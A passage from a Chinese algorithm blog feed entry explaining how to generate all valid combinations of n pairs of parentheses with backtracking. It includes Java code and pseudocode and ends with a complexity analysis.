题，要求如下：</p><p>请你写一个算法，输入是一个正整数 <code>n</code>，输出是 <code>n</code> 对括号的所有合法组合，函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br></pre></td></tr></table></figure><p>比如说，输入 <code>n=3</code>，输出为如下 5 个字符串：</p><p>“((()))”, “(()())”, “(())()”, “()(())”, “()()()”</p><p>有关括号问题，你只要记住以下性质，思路就很容易想出来：</p><p><strong>1、一个「合法」括号组合的左括号数量一定等于右括号数量，这个很好理解</strong>。</p><p><strong>2、对于一个「合法」的括号字符串组合 <code>p</code>，必然对于任何 <code>0 &lt;= i &lt; len(p)</code> 都有：子串 <code>p[0..i]</code> 中左括号的数量都大于或等于右括号的数量</strong>。</p><p>如果不跟你说这个性质，可能不太容易发现，但是稍微想一下，其实很容易理解，因为从左往右算的话，肯定是左括号多嘛，到最后左右括号数量相等，说明这个括号组合是合法的。</p><p>反之，比如这个括号组合 <code>))((</code>，前几个子串都是右括号多于左括号，显然不是合法的括号组合。</p><p>下面就来手把手实践一下回溯算法框架。</p><p><strong>回溯思路</strong></p><p>明白了合法括号的性质，如何把这道题和回溯算法扯上关系呢？</p><p>算法输入一个整数 <code>n</code>，让你计算 <strong><code>n</code> 对括号</strong>能组成几种合法的括号组合，可以改写成如下问题：</p><p><strong>现在有 <code>2n</code> 个位置，每个位置可以放置字符 <code>(</code> 或者 <code>)</code>，组成的所有括号组合中，有多少个是合法的</strong>？</p><p>这个命题和题目的意思完全是一样的对吧，那么我们先想想如何得到全部 <code>2^(2n)</code> 种组合，然后再根据我们刚才总结出的合法括号组合的性质筛选出合法的组合，不就完事儿了？</p><p>如何得到所有的组合呢？这就是标准的暴力穷举回溯框架啊，我们前文 <a href="https://labuladong.gitee.io/algo/算法思维系列/回溯算法详解修订版.html">回溯算法套路框架详解</a> 都总结过了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkedList&lt;Integer&gt; result = <span class="keyword">new</span> List&lt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(路径, 选择列表)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件&#123;</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(选择：选择列表)&#123;</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么对于我们的需求，如何打印所有括号组合呢？套一下框架就出来了，伪码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> i, String track)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// i 代表当前的位置，共 2n 个位置</span></span><br><span class="line">    <span class="comment">// 穷举到最后一个位置了，得到一个长度为 2n 组合</span></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">2</span> * n) &#123;</span><br><span class="line">        print(track);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于每个位置可以是左括号或者右括号两种选择</span></span><br><span class="line">    <span class="keyword">for</span> choice in [<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>] &#123;</span><br><span class="line">        track.push(choice); <span class="comment">// 做选择</span></span><br><span class="line">        <span class="comment">// 穷举下一个位置</span></span><br><span class="line">        backtrack(n, i + <span class="number">1</span>, track);</span><br><span class="line">        track.pop(choice); <span class="comment">// 撤销选择</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，现在能够打印所有括号组合了，如何从它们中筛选出合法的括号组合呢？很简单，加几个条件进行「剪枝」就行了。</p><p>对于 <code>2n</code> 个位置，必然有 <code>n</code> 个左括号，<code>n</code> 个右括号，所以我们不是简单的记录穷举位置 <code>i</code>，而是<strong>用 <code>left</code> 记录还可以使用多少个左括号，用 <code>right</code> 记录还可以使用多少个右括号</strong>，这样就可以通过刚才总结的合法括号规律进行筛选了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//结果数组</span></span><br><span class="line">    LinkedList&lt;String&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="comment">//回溯路径</span></span><br><span class="line">    StringBuilder track = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="comment">// 可用的左括号和右括号数量初始化为 n</span></span><br><span class="line">    backtrack(n, n, track, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, StringBuilder track, LinkedList&lt;String&gt; res)</span></span>&#123;</span><br><span class="line">    <span class="comment">//剩下可用左括号多，不合法</span></span><br><span class="line">    <span class="keyword">if</span>(left &gt; right)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//剩余可用&lt;0,不合法</span></span><br><span class="line">    <span class="keyword">if</span>(left &lt; <span class="number">0</span> || right &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//剩余括号正好为0合法</span></span><br><span class="line">    <span class="keyword">if</span>(left == <span class="number">0</span> &amp;&amp; right == <span class="number">0</span>)&#123;</span><br><span class="line">        String s = track.toString();</span><br><span class="line">        res.add(s);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//放左括号</span></span><br><span class="line">    track.append(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    backtrack(left - <span class="number">1</span>, right, track, res);</span><br><span class="line">    track.deleteCharAt(track.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//放右括号</span></span><br><span class="line">    track.append(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    backtrack(left, right - <span class="number">1</span>, track, res);</span><br><span class="line">    track.deleteCharAt(track.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们的算法就完成了，算法的复杂度是多少呢？这个比较难分析，<strong>对于递归相关的算法，时间复杂度这样计算（递归次数）*（递归函数本身的时间复杂度）</strong>。</p><p><code>backtrack</code> 就是我们的递归函数，其中没有任何 for 循环代码，所以递归函数本身的时间复杂度是 O(1)，但关键是这个函数的递归次数是多少？换句话说，给定一个 <code>n</code>，<code>backtrack</code> 函数递归被调用了多少次？</p><p>我们前面怎么分析动态规划算法的递归次数的？主要是看「状态」的个数对吧。其实回溯算法和动态规划的本质都是穷举，只不过动态规划存在「重叠子问题」可以优化，而回溯算法不存在而已。</p><p>所以说这里也可以用「状态」这个概念，<strong>对于 <code>backtrack</code> 函数，状态有三个，分别是 <code>left, right, track</code></strong>，这三个变量的所有组合个数就是 <code>backtrack</code> 函数的状态个数（调用次数）。</p><p><code>left</code> 和 <code>right</code> 的组合好办，他俩取值就是 0~n 嘛，组合起来也就 <code>n^2</code> 种而已；这个 <code>track</code> 的长度虽然取在 0~2n，但对于每一个长度，它还有指数级的括号组合，这个是不好算的，是 $\frac{4^{n}}{\sqrt{n}}$。</p>]]></content>
    
    
    <summary type="html">回溯算法是一个决策树的遍历过程。</summary>
    
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="回溯" scheme="http://lishuaiyun.cn/tags/%E5%9B%9E%E6%BA%AF/"/>
    
  </entry>
  
</feed>
